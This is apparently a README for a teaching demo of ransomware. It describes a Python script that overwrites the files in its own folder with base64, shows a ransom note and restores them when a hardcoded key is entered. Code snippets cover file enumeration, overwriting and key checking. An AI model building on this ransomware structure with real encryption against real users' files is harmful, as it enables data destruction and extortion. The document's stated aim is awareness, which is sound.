# Ransomware

Our **ransomware** is implemented in the file `ransomware.py`. It encrypts all files in the same directory and shows a ransom message, requesting financial amount of 0.1 USD for user to obtain the key. Once the user provides the correct key, it decrypts those files, otherwise they would stay encrypted.

#### Demonstration of behavior

Before the execution of **ransomware** observe `target_file.ext`. It is a simple file located in the same directory as out **ransomware**. To see the behavior of **ransomware**, simple execute it in this folder (`./ransomware`). You should see something like this:

```
DEBUG:root:Encrypting file: malware_showcase/ransomware/target_file.ext
Hi, all your files has been encrypted. Please send 0.1 USD on this address
to get a decryption key: XYZ.
Number of encrypted files: 1
Please enter a key:
```

Now do not type anything, just observe `target_file.ext` in the second terminal. You can see that its original content `Just an ordinary text file.` was encoded to `SnVzdCBhbiBvcmRpbmFyeSB0ZXh0IGZpbGUuCg==` (for the more experienced users it is obvious that it is a simple format of **base64**). However, this **ransomware** assumes that the user does not know the basics of cryptography. Now we have two options as the user. We might guess the key, in which case the program ends and our files stay encrypted, or we "send a payment to the bank address XYZ" and obtain the correct key:
```
Please enter a key: __ransomware_key
```
This triggers a decryption of data and as we can observe, the content of our file is restored.

Creation of basic **ransomware** is very simple process as it is described below and anyone can do it just with basics in programming and understandment of encryption. That's why we should be always cautious when we execute any uncommon or not trusted files.

#### How does it work?

- Firstly, we create our **ransomware** and give it a name. <br>
  ```python
  ransomware = Ransomware('SimpleRansomware')
  ```
- Then we must **choose a folder** with files we want to encrypt. We call function *encrypt_files_in_folder* that is provided by our **ransomware** and pass the path to the folder as an argument. This function returns the number encrypted files. <br>
  ```python
  number_encrypted_files = ransomware.encrypt_files_in_folder(path)
  ```
- The first thing that needs to be done is a lookup for all filenames in the same directory (function _get_files_in_folder(path)_). This implementation ignores _README_ files, because **ransomware** would encrypt also this file as well if you run it.
- Then we can simple encrypt each found file. The process of encryption is described below.
  ```python
  for file in files:
     logging.debug('Encrypting file: {}'.format(file))
     self.encrypt_file(file)
  ```
 - The encryption part is the most important. There are many ways of how to encrypt the files. Usually 
 the encryption key would take a part in encryption as well (with much stronger encryption algorithm), but for demonstration we can use basic encoding **base64**. To learn more about **base64** see [the guide to base64](https://blogs.oracle.com/rammenon/base64-explained). In this case we load the data from the file, encrypt them to base64 and then write them back to the file.
   ```python
   # Load the content of file.
   with open(filename, 'r') as file:
 	  content = file.read()
   # Encrypt the file content with base64.
   encrypted_data = base64.b64encode(content.encode('utf-8'))
   # Rewrite the file with the encoded content.
   with open(filename, 'w') as file:
      file.write(encrypted_data.decode('utf-8'))
    ```
 - Once all files are encrypted, we can show our ransom message to the user, requesting money for the key.
 - The decryption part is very similar to encryption. However, in this case we load the key and compare it with our default key `__ransomware_key`. If they are equal, we simply revert the previously done encryption. If the user enters a different key, the program ends and the files stay encrypted.
    ```python
    # Obtain a key from the user.
    key = self.obtain_key()
    if key != self.key:
 	   print('Wrong key!')
       return

    files = self.get_files_in_folder(path)

    # Decrypt each file in the directory.
    for file in files:
 	    self.decrypt_file(key, file)
    ```
